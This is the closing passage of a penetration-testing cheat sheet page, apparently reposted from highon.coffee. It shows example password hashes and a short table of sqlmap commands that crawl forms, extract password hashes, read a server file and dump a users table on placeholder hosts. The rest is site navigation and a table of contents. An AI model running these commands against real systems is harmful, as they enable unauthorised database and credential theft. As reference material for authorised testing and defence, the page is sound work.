<td>SHA-256 $SALT:$PASS</td>
<td><code>eb368a2dfd38b405f014118c7d9747fcc97f4&lt;br&gt;f0ee75c05963cd9da6ee65ef498:560407001617</code></td>
</tr>
<tr>
<td>SHA-512</td>
<td><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9&lt;br&gt;664fbb7adf72492e3c81ebd3e29134d9bc&lt;br&gt;12212bf83c6840f10e8246b9db54a4&lt;br&gt;859b7ccd0123d86e5872c1e5082f</code></td>
</tr>
<tr>
<td>SHA-512 $PASS:$SALT</td>
<td><code>e5c3ede3e49fb86592fb03f471c35ba13e8&lt;br&gt;d89b8ab65142c9a8fdafb635fa2223c24e5&lt;br&gt;558fd9313e8995019dcbec1fb58414&lt;br&gt;6b7bb12685c7765fc8c0d51379fd</code></td>
</tr>
<tr>
<td>SHA-512 $SALT:$PASS</td>
<td><code>976b451818634a1e2acba682da3fd6ef&lt;br&gt;a72adf8a7a08d7939550c244b237c72c7d4236754&lt;br&gt;4e826c0c83fe5c02f97c0373b6b1&lt;br&gt;386cc794bf0d21d2df01bb9c08a</code></td>
</tr>
<tr>
<td>NTLM Hash Example</td>
<td><code>b4b9b02e6f09a9bd760f388b67351e2b</code></td>
</tr>
</tbody>
</table>
<h2 id="SQLMap-Examples"><a href="#SQLMap-Examples" class="headerlink" title="SQLMap Examples"></a>SQLMap Examples</h2><p>A mini SQLMap cheat sheet:</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sqlmap -u http://meh.com --forms --batch --crawl=10 &lt;br&gt; --cookie=jsessionid=54321 --level=5 --risk=3</code></td>
<td>Automated sqlmap scan</td>
</tr>
<tr>
<td><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE &lt;br&gt; --level=3 --current-user --current-db --passwords &lt;br&gt; --file-read=&quot;/var/www/blah.php&quot;</code></td>
<td>Targeted sqlmap scan</td>
</tr>
<tr>
<td><code>sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; &lt;br&gt;--dbms=mysql --tech=U --random-agent --dump</code></td>
<td>Scan url for union + error based injection with mysql backendand use a random user agent + database dump</td>
</tr>
<tr>
<td><code>sqlmap -o -u &quot;http://meh.com/form/&quot; --forms</code></td>
<td>sqlmap check form for injection</td>
</tr>
<tr>
<td><code>sqlmap -o -u &quot;http://meh/vuln-form&quot; --forms &lt;br&gt; -D database-name -T users --dump</code></td>
<td>sqlmap dump and crack hashes for table users on database-name.</td>
</tr>
</tbody>
</table>
<p>原文链接：<a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" target="_blank" rel="external">https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/project/">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pre-engagement"><span class="toc-number">2.</span> <span class="toc-text">Pre-engagement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Network-Configuration"><span class="toc-number">2.1.</span> <span class="toc-text">Network Configuration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Set-IP-Address"><span class="toc-number">2.1.1.</span> <span class="toc-text">Set IP Address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Subnetting"><span class="toc-number">2.1.2.</span> <span class="toc-text">Subnetting</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">3.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Passive-Information-Gathering"><span class="toc-number">3.1.</span> <span class="toc-text">Passive Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS"><span class="toc-number">3.1.1.</span> <span class="toc-text">DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WHOIS-enumeration"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">WHOIS enumeration</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Perform-DNS-IP-Lookup"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">Perform DNS IP Lookup</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Perform-MX-Record-Lookup"><span class="toc-number">3.1.1.3.</span> <span class="toc-text">Perform MX Record Lookup</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Perform-Zone-Transfer-with-DIG"><span class="toc-number">3.1.1.4.</span> <span class="toc-text">Perform Zone Transfer with DIG</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Zone-Transfers"><span class="toc-number">4.</span> <span class="toc-text">DNS Zone Transfers</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Email"><span class="toc-number">4.0.1.</span> <span class="toc-text">Email</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Simply-Email"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">Simply Email</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Semi-Active-Information-Gathering"><span class="toc-number">4.1.</span> <span class="toc-text">Semi Active Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Basic-Finger-Printing"><span class="toc-number">4.1.1.</span> <span class="toc-text">Basic Finger Printing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Banner-grabbing-with-NC"><span class="toc-number">4.1.2.</span> <span class="toc-text">Banner grabbing with NC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-Information-Gathering"><span class="toc-number">4.2.</span> <span class="toc-text">Active Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-Bruteforce"><span class="toc-number">4.2.1.</span> <span class="toc-text">DNS Bruteforce</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DNSRecon"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">DNSRecon</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">4.2.2.</span> <span class="toc-text">Port Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Nmap-Commands"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">Nmap Commands</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Nmap-UDP-Scanning"><span class="toc-number">4.2.2.1.1.</span> <span class="toc-text">Nmap UDP Scanning</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#UDP-Protocol-Scanner"><span class="toc-number">4.2.2.1.2.</span> <span class="toc-text">UDP Protocol Scanner</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Other-Host-Discovery"><span class="toc-number">4.2.2.1.3.</span> <span class="toc-text">Other Host Discovery</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-amp-Attacking-Network-Services"><span class="toc-number">5.</span> <span class="toc-text">Enumeration & Attacking Network Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SAMB-SMB-Windows-Domain-Enumeration"><span class="toc-number">5.1.</span> <span class="toc-text">SAMB / SMB / Windows Domain Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Samba-Enumeration"><span class="toc-number">5.1.1.</span> <span class="toc-text">Samba Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SMB-Enumeration-Tools"><span class="toc-number">5.1.1.1.</span> <span class="toc-text">SMB Enumeration Tools</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fingerprint-SMB-Version"><span class="toc-number">5.1.1.2.</span> <span class="toc-text">Fingerprint SMB Version</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Find-open-SMB-Shares"><span class="toc-number">5.1.1.3.</span> <span class="toc-text">Find open SMB Shares</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Enumerate-SMB-Users"><span class="toc-number">5.1.1.4.</span> <span class="toc-text">Enumerate SMB Users</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Manual-Null-session-testing"><span class="toc-number">5.1.1.5.</span> <span class="toc-text">Manual Null session testing:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NBTScan-unixwiz"><span class="toc-number">5.1.1.6.</span> <span class="toc-text">NBTScan unixwiz</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LLMNR-NBT-NS-Spoofing"><span class="toc-number">5.2.</span> <span class="toc-text">LLMNR / NBT-NS Spoofing</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Metasploit-LLMNR-NetBIOS-requests"><span class="toc-number">5.2.0.1.</span> <span class="toc-text">Metasploit LLMNR / NetBIOS requests</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Responder-py"><span class="toc-number">5.2.1.</span> <span class="toc-text">Responder.py</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Run-Responder-py-for-the-whole-engagement"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">Run Responder.py for the whole engagement</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SNMP-Enumeration-Tools"><span class="toc-number">5.3.</span> <span class="toc-text">SNMP Enumeration Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SNMPv3-Enumeration-Tools"><span class="toc-number">5.3.1.</span> <span class="toc-text">SNMPv3 Enumeration Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Use-Metasploits-Wordlist"><span class="toc-number">5.3.1.1.</span> <span class="toc-text">Use Metasploits Wordlist</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-Services-Enumeration"><span class="toc-number">5.4.</span> <span class="toc-text">R Services Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RSH-Enumeration"><span class="toc-number">5.4.1.</span> <span class="toc-text">RSH Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#RSH-Run-Commands"><span class="toc-number">5.4.1.1.</span> <span class="toc-text">RSH Run Commands</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Metasploit-RSH-Login-Scanner"><span class="toc-number">5.4.1.2.</span> <span class="toc-text">Metasploit RSH Login Scanner</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rusers-Show-Logged-in-Users"><span class="toc-number">5.4.1.3.</span> <span class="toc-text">rusers Show Logged in Users</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rusers-scan-whole-Subnet"><span class="toc-number">5.4.1.4.</span> <span class="toc-text">rusers scan whole Subnet</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finger-Enumeration"><span class="toc-number">5.5.</span> <span class="toc-text">Finger Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Finger-a-Specific-Username"><span class="toc-number">5.5.1.</span> <span class="toc-text">Finger a Specific Username</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solaris-bug-that-shows-all-logged-in-users"><span class="toc-number">5.5.2.</span> <span class="toc-text">Solaris bug that shows all logged in users:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rwho"><span class="toc-number">5.6.</span> <span class="toc-text">rwho</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TLS-amp-SSL-Testing"><span class="toc-number">6.</span> <span class="toc-text">TLS & SSL Testing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#testssl-sh"><span class="toc-number">6.1.</span> <span class="toc-text">testssl.sh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Assessment"><span class="toc-number">7.</span> <span class="toc-text">Vulnerability Assessment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Database-Penetration-Testing"><span class="toc-number">8.</span> <span class="toc-text">Database Penetration Testing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle"><span class="toc-number">8.1.</span> <span class="toc-text">Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fingerprint-Oracle-TNS-Version"><span class="toc-number">8.1.1.</span> <span class="toc-text">Fingerprint Oracle TNS Version</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Brute-force-oracle-user-accounts"><span class="toc-number">8.1.2.</span> <span class="toc-text">Brute force oracle user accounts</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Oracle-Privilege-Escalation"><span class="toc-number">8.1.3.</span> <span class="toc-text">Oracle Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Identify-default-accounts-within-oracle-db-using-NMAP-NSE-scripts"><span class="toc-number">8.1.3.1.</span> <span class="toc-text">Identify default accounts within oracle db using NMAP NSE scripts:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#How-to-identify-the-current-privilege-level-for-an-oracle-user"><span class="toc-number">8.1.3.2.</span> <span class="toc-text">How to identify the current privilege level for an oracle user:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Oracle-priv-esc-and-obtain-DBA-access"><span class="toc-number">8.1.3.3.</span> <span class="toc-text">Oracle priv esc and obtain DBA access:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Run-the-exploit-with-a-select-query"><span class="toc-number">8.1.3.4.</span> <span class="toc-text">Run the exploit with a select query:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Remove-the-exploit-using"><span class="toc-number">8.1.3.5.</span> <span class="toc-text">Remove the exploit using:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Get-Oracle-Reverse-os-shell"><span class="toc-number">8.1.3.6.</span> <span class="toc-text">Get Oracle Reverse os-shell:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL"><span class="toc-number">8.2.</span> <span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Use-MS-SQL-Servers-Browse-For-More"><span class="toc-number">8.2.0.1.</span> <span class="toc-text">Use MS SQL Servers Browse For More</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bruteforce-MSSQL-Login"><span class="toc-number">8.2.1.</span> <span class="toc-text">Bruteforce MSSQL Login</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-MSSQL-Shell"><span class="toc-number">8.2.2.</span> <span class="toc-text">Metasploit MSSQL Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network"><span class="toc-number">9.</span> <span class="toc-text">Network</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Plink-exe-Tunnel"><span class="toc-number">9.1.</span> <span class="toc-text">Plink.exe Tunnel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivoting"><span class="toc-number">9.2.</span> <span class="toc-text">Pivoting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-Pivoting"><span class="toc-number">9.2.1.</span> <span class="toc-text">SSH Pivoting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-Pivoting"><span class="toc-number">9.2.2.</span> <span class="toc-text">Meterpreter Pivoting</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TTL-Finger-Printing"><span class="toc-number">9.3.</span> <span class="toc-text">TTL Finger Printing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPv4-Cheat-Sheets"><span class="toc-number">9.4.</span> <span class="toc-text">IPv4 Cheat Sheets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Classful-IP-Ranges"><span class="toc-number">9.4.1.</span> <span class="toc-text">Classful IP Ranges</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IPv4-Private-Address-Ranges"><span class="toc-number">9.4.2.</span> <span class="toc-text">IPv4 Private Address Ranges</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IPv4-Subnet-Cheat-Sheet"><span class="toc-number">9.4.3.</span> <span class="toc-text">IPv4 Subnet Cheat Sheet</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VLAN-Hopping"><span class="toc-number">9.5.</span> <span class="toc-text">VLAN Hopping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VPN-Pentesting-Tools"><span class="toc-number">9.6.</span> <span class="toc-text">VPN Pentesting Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IKEForce"><span class="toc-number">9.6.1.</span> <span class="toc-text">IKEForce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IKE-Aggressive-Mode-PSK-Cracking"><span class="toc-number">9.6.2.</span> <span class="toc-text">IKE Aggressive Mode PSK Cracking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Step-1-Idenitfy-IKE-Servers"><span class="toc-number">9.6.2.1.</span> <span class="toc-text">Step 1: Idenitfy IKE Servers</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Step-2-Enumerate-group-name-with-IKEForce"><span class="toc-number">9.6.2.2.</span> <span class="toc-text">Step 2: Enumerate group name with IKEForce</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Step-3-Use-ike-scan-to-capture-the-PSK-hash"><span class="toc-number">9.6.2.3.</span> <span class="toc-text">Step 3: Use ike-scan to capture the PSK hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Step-4-Use-psk-crack-to-crack-the-PSK-hash"><span class="toc-number">9.6.2.4.</span> <span class="toc-text">Step 4: Use psk-crack to crack the PSK hash</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PPTP-Hacking"><span class="toc-number">9.6.3.</span> <span class="toc-text">PPTP Hacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NMAP-PPTP-Fingerprint"><span class="toc-number">9.6.3.1.</span> <span class="toc-text">NMAP PPTP Fingerprint:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PPTP-Dictionary-Attack"><span class="toc-number">9.6.3.2.</span> <span class="toc-text">PPTP Dictionary Attack</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Tunneling"><span class="toc-number">9.7.</span> <span class="toc-text">DNS Tunneling</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Attacking-Machine"><span class="toc-number">9.7.1.</span> <span class="toc-text">Attacking Machine</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Exploit"><span class="toc-number">10.</span> <span class="toc-text">BOF / Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Research"><span class="toc-number">11.</span> <span class="toc-text">Exploit Research</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Searching-for-Exploits"><span class="toc-number">11.1.</span> <span class="toc-text">Searching for Exploits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compiling-Windows-Exploits-on-Kali"><span class="toc-number">11.2.</span> <span class="toc-text">Compiling Windows Exploits on Kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cross-Compiling-Exploits"><span class="toc-number">11.3.</span> <span class="toc-text">Cross Compiling Exploits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-Common-Vulnerabilities"><span class="toc-number">11.4.</span> <span class="toc-text">Exploiting Common Vulnerabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploiting-Shellshock"><span class="toc-number">11.4.1.</span> <span class="toc-text">Exploiting Shellshock</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cat-file-view-file-contents"><span class="toc-number">11.4.1.1.</span> <span class="toc-text">cat file (view file contents)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Shell-Shock-run-bind-shell"><span class="toc-number">11.4.1.2.</span> <span class="toc-text">Shell Shock run bind shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Shell-Shock-reverse-Shell"><span class="toc-number">11.4.1.3.</span> <span class="toc-text">Shell Shock reverse Shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-Local-Web-Servers"><span class="toc-number">12.</span> <span class="toc-text">Simple Local Web Servers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mounting-File-Shares"><span class="toc-number">13.</span> <span class="toc-text">Mounting File Shares</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-HTTPS-Webserver-Enumeration"><span class="toc-number">14.</span> <span class="toc-text">HTTP / HTTPS Webserver Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Packet-Inspection"><span class="toc-number">15.</span> <span class="toc-text">Packet Inspection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Username-Enumeration"><span class="toc-number">16.</span> <span class="toc-text">Username Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-User-Enumeration"><span class="toc-number">16.1.</span> <span class="toc-text">SMB User Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SNMP-User-Enumeration"><span class="toc-number">16.2.</span> <span class="toc-text">SNMP User Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Passwords"><span class="toc-number">17.</span> <span class="toc-text">Passwords</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Wordlists"><span class="toc-number">17.1.</span> <span class="toc-text">Wordlists</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Forcing-Services"><span class="toc-number">18.</span> <span class="toc-text">Brute Forcing Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hydra-FTP-Brute-Force"><span class="toc-number">18.1.</span> <span class="toc-text">Hydra FTP Brute Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hydra-POP3-Brute-Force"><span class="toc-number">18.2.</span> <span class="toc-text">Hydra POP3 Brute Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hydra-SMTP-Brute-Force"><span class="toc-number">18.3.</span> <span class="toc-text">Hydra SMTP Brute Force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Cracking"><span class="toc-number">19.</span> <span class="toc-text">Password Cracking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#John-The-Ripper-JTR"><span class="toc-number">19.1.</span> <span class="toc-text">John The Ripper - JTR</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Penetration-Testing-Commands"><span class="toc-number">20.</span> <span class="toc-text">Windows Penetration Testing Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Penetration-Testing-Commands"><span class="toc-number">21.</span> <span class="toc-text">Linux Penetration Testing Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Compiling-Exploits"><span class="toc-number">22.</span> <span class="toc-text">Compiling Exploits</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-if-C-code-is-for-Windows-or-Linux"><span class="toc-number">22.1.</span> <span class="toc-text">Identifying if C code is for Windows or Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Build-Exploit-GCC"><span class="toc-number">22.2.</span> <span class="toc-text">Build Exploit GCC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GCC-Compile-32Bit-Exploit-on-64Bit-Kali"><span class="toc-number">22.3.</span> <span class="toc-text">GCC Compile 32Bit Exploit on 64Bit Kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile-Windows-exe-on-Linux"><span class="toc-number">22.4.</span> <span class="toc-text">Compile Windows .exe on Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID-Binary"><span class="toc-number">23.</span> <span class="toc-text">SUID Binary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-C-Shell-for-bin-bash"><span class="toc-number">23.1.</span> <span class="toc-text">SUID C Shell for /bin/bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID-C-Shell-for-bin-sh"><span class="toc-number">23.2.</span> <span class="toc-text">SUID C Shell for /bin/sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Building-the-SUID-Shell-binary"><span class="toc-number">23.3.</span> <span class="toc-text">Building the SUID Shell binary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shells"><span class="toc-number">24.</span> <span class="toc-text">Reverse Shells</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TTY-Shells"><span class="toc-number">25.</span> <span class="toc-text">TTY Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-TTY-Shell-Trick"><span class="toc-number">25.1.</span> <span class="toc-text">Python TTY Shell Trick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-Interactive-sh-shell"><span class="toc-number">25.2.</span> <span class="toc-text">Spawn Interactive sh shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-Perl-TTY-Shell"><span class="toc-number">25.3.</span> <span class="toc-text">Spawn Perl TTY Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-Ruby-TTY-Shell"><span class="toc-number">25.4.</span> <span class="toc-text">Spawn Ruby TTY Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-Lua-TTY-Shell"><span class="toc-number">25.5.</span> <span class="toc-text">Spawn Lua TTY Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-TTY-Shell-from-Vi"><span class="toc-number">25.6.</span> <span class="toc-text">Spawn TTY Shell from Vi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-TTY-Shell-NMAP"><span class="toc-number">25.7.</span> <span class="toc-text">Spawn TTY Shell NMAP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-Cheat-Sheet"><span class="toc-number">26.</span> <span class="toc-text">Metasploit Cheat Sheet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter-Payloads"><span class="toc-number">26.1.</span> <span class="toc-text">Meterpreter Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-reverse-meterpreter-payload"><span class="toc-number">26.2.</span> <span class="toc-text">Windows reverse meterpreter payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-VNC-Meterpreter-payload"><span class="toc-number">26.3.</span> <span class="toc-text">Windows VNC Meterpreter payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Reverse-Meterpreter-payload"><span class="toc-number">26.4.</span> <span class="toc-text">Linux Reverse Meterpreter payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meterpreter-Cheat-Sheet"><span class="toc-number">27.</span> <span class="toc-text">Meterpreter Cheat Sheet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Common-Metasploit-Modules"><span class="toc-number">28.</span> <span class="toc-text">Common Metasploit Modules</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Windows-Metasploit-Modules-exploits"><span class="toc-number">28.1.</span> <span class="toc-text">Remote Windows Metasploit Modules (exploits)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-Windows-Metasploit-Modules-exploits"><span class="toc-number">28.2.</span> <span class="toc-text">Local Windows Metasploit Modules (exploits)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Auxilary-Metasploit-Modules"><span class="toc-number">28.3.</span> <span class="toc-text">Auxilary Metasploit Modules</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-Powershell-Modules"><span class="toc-number">28.4.</span> <span class="toc-text">Metasploit Powershell Modules</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Post-Exploit-Windows-Metasploit-Modules"><span class="toc-number">28.5.</span> <span class="toc-text">Post Exploit Windows Metasploit Modules</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASCII-Table-Cheat-Sheet"><span class="toc-number">29.</span> <span class="toc-text">ASCII Table Cheat Sheet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCO-IOS-Commands"><span class="toc-number">30.</span> <span 